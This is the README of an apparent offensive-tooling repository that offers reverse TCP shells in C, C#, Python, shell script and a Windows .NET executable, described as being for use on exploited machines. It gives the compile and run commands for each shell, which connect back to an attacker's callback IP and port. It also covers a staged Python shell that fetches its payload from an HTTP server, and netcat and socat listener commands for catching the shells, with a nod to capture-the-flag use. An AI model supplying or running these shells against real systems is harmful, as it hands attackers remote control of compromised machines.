# Reverse-Shell-Lib
The following repository contains multiple versions of a reverse tcp netcat shell for use on exploited Linux or Unix machines

# C Reverse Shell
  In order to use this shell it must be compiled with the following command
  
    gcc reverse_tcp.c -o reverse_tcp
  
  It may then be called by:
  
    ./reverse_tcp [callback_ip] [port]
  
 
# C# Reverse Shell
  If dotnet is installed on the system you may use the C# program
  
  In order to use this shell it must be compiled with the following command
  
    dotnet build reverse_tcp.cs
    
  It may then be called by:
    
    ./reverse_tcp [callback_ip] [port]
  
# Python Reverse Shell
  If python3 is on the system you may use the reverse_tcp.py script
  
  Simply call it with the following command:
  
    python3 reverse_tcp.py [callback_ip] [port]
  
  # Staged Python Shell
  If you wish to run a staged shell you must first host the "reverse_tcp.py" payload on a HTTP server and you must configure its default callback address

  to call a staged shell run the following command:

    python3 reverse_tcp_staged.py http://[HTTPSERVER]/[route to reverse_tcp.py]
  
# Shell Script Reverse Shell
  This should be the most effective as it should run on all targets and is in fact the smallest payload
  
  Simply chmod it and call it like so:
    
    ./reverse_tcp.sh [callback_ip] [port]
    
 # Windows Reverse Powershell
  Since none of the other methods work on windows the reverse_tcp.exe is a .NET executable with the same ease of use as the others
  
  To run this on a target simply run it from the command line like so:
  
    .\reverse_tcp.exe [callback_ip] [port]
    
    
# Attacker Listener
  These reverse shells were all written for ease of use attackers can open a simple netcat or socat listener to receive the payloads
  
  Netcat:
  
    nc -nvlp [port]
    
  Socat:
  
    socat -d -d TCP4-LISTEN:[port] STDOUT
    
  Once your listener is up just wait for the payload to come your way and get them flags XD
    
